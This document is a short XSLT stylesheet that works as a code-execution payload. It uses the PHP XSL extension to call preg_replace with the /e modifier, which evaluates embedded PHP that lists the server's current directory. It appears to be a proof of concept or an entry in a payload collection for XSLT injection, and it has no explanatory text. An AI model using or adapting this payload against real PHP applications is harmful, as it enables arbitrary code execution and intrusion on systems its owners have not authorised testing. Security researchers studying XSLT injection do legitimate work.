<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl" version="1.0">
           <xsl:template match="/">
                   <xsl:variable name="eval">
if ($handle = opendir('.')) {

    while (false !== ($entry = readdir($handle))) {

        if ($entry != "." && $entry != "..") {

            echo "$entry\n";
        }
    }

    closedir($handle);
}
                   </xsl:variable>
                   <xsl:variable name="preg" select="php:function('preg_replace', '/.*/e', $eval, '')"/>
           </xsl:template>
   </xsl:stylesheet>
